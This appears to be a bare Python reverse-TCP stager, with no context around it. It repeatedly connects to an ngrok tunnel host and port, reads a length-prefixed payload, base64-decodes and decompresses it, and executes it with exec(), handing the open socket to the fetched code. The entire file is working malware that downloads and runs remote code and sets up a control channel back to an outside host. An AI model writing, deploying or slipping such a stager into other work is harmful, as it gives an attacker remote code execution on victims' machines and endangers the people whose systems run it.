import socket
import zlib
import base64
import struct
import time

for _ in range(10):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('2.tcp.eu.ngrok.io', 13364))
        break
    except:
        time.sleep(5)

l = struct.unpack('>I', s.recv(4))[0]


d = s.recv(l)
while len(d) < l:
    d += s.recv(l - len(d))

exec(zlib.decompress(base64.b64decode(d)), {'s': s})
